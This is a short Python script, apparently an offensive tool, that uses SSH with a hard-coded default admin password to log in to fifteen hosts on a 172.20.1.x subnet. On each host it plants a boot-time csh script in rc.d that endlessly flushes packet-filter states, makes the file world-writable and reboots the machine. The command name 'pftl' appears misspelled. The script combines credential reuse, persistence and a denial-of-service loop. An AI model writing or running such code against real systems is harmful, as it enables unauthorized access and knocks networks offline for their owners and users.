import paramiko

fuckshitscript = """
#!/bin/csh
while (1 <= 1)
    pftl -F state
end
"""

commandforwriting = ""
for line in fuckshitscript.split("\n"):
    print("line: " + line)
    commandforwriting += 'echo "' + line + '";'

host = ""
username = "admin"
password = "Change.me123!"

for x in range(16):
    if(x==9):
        continue
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect("172.20.1." + str(x), username=username, password=password)
    client.exec_command(commandforwriting + " > /usr/local/etc/rc.d/ctsh.sh")
    client.exec_command("chmod 777 /usr/local/etc/rc.d/ctsh.sh")
    client.exec_command("reboot")
